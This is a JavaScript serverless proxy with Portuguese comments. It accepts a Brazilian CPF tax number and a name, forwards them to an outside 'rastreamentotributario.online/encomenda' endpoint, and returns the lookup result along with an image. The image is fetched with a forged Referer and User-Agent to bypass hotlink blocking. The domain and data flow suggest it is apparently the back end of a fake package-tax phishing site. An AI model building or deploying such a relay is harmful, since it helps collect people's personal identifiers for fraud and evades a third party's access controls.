/**
 * Proxy para a API original de CPF/nome e imagem.
 * Encaminha POST para https://rastreamentotributario.online/encomenda/api/api.php
 */

const API_ORIGINAL = 'https://rastreamentotributario.online/encomenda/api/api.php';

exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: JSON.stringify({ success: false, message: 'Method not allowed' }) };
  }

  let cpf = '';
  let nome = '';

  try {
    const contentType = (event.headers['content-type'] || event.headers['Content-Type'] || '').toLowerCase();

    if (contentType.includes('application/json')) {
      const data = JSON.parse(event.body || '{}');
      cpf = (data.cpf || '').toString().replace(/\D/g, '');
      nome = (data.nome || '').toString().trim();
    } else if (contentType.includes('application/x-www-form-urlencoded')) {
      const params = new URLSearchParams(event.body || '');
      cpf = (params.get('cpf') || '').toString().replace(/\D/g, '');
      nome = (params.get('nome') || '').toString().trim();
    } else if (contentType.includes('multipart/form-data') && event.body) {
      const boundary = contentType.split('boundary=')[1]?.replace(/["\s;-]/g, '').trim();
      if (boundary) {
        const parts = event.body.split('--' + boundary);
        for (const part of parts) {
          const nameMatch = part.match(/name="(cpf|nome)"\s*\r?\n\r?\n([\s\S]*?)(?=\r?\n--|$)/);
          if (nameMatch) {
            const val = (nameMatch[2] || '').replace(/\r?\n.*$/s, '').trim();
            if (nameMatch[1] === 'cpf') cpf = val.replace(/\D/g, '');
            else nome = val;
          }
        }
      }
    }
  } catch (e) {
    console.error('Parse body error:', e);
    return {
      statusCode: 200,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ success: false, message: 'Dados inválidos.' })
    };
  }

  if (!cpf || cpf.length !== 11) {
    return {
      statusCode: 200,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ success: false, message: 'CPF não informado ou inválido.' })
    };
  }

  try {
    const form = new URLSearchParams();
    form.set('cpf', cpf);
    form.set('nome', nome);

    const res = await fetch(API_ORIGINAL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json'
      },
      body: form.toString()
    });

    const text = await res.text();
    let json;
    try {
      json = JSON.parse(text);
    } catch {
      json = { success: false, message: 'Resposta inválida da API.' };
    }

    // Busca a imagem server-side e converte para base64 (evita bloqueio por Referer/hotlink)
    if (json.success && json.imagem && typeof json.imagem === 'string') {
      let imgUrl = json.imagem.trim();
      if (imgUrl.startsWith('/')) {
        imgUrl = 'https://rastreamentotributario.online' + imgUrl;
      }
      if (imgUrl.startsWith('http://') || imgUrl.startsWith('https://')) {
        try {
          const imgRes = await fetch(imgUrl, {
            headers: {
              'Accept': 'image/*',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
              'Referer': 'https://rastreamentotributario.online/'
            }
          });
          if (imgRes.ok) {
            const buf = await imgRes.arrayBuffer();
            const b64 = Buffer.from(buf).toString('base64');
            const contentType = imgRes.headers.get('content-type') || 'image/jpeg';
            json.imagem = 'data:' + contentType.split(';')[0] + ';base64,' + b64;
          }
        } catch (imgErr) {
          console.error('Erro ao buscar imagem:', imgErr);
        }
      }
    }

    return {
      statusCode: 200,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(json)
    };
  } catch (err) {
    console.error('API proxy error:', err);
    return {
      statusCode: 200,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ success: false, message: 'Erro ao consultar. Tente novamente.' })
    };
  }
};
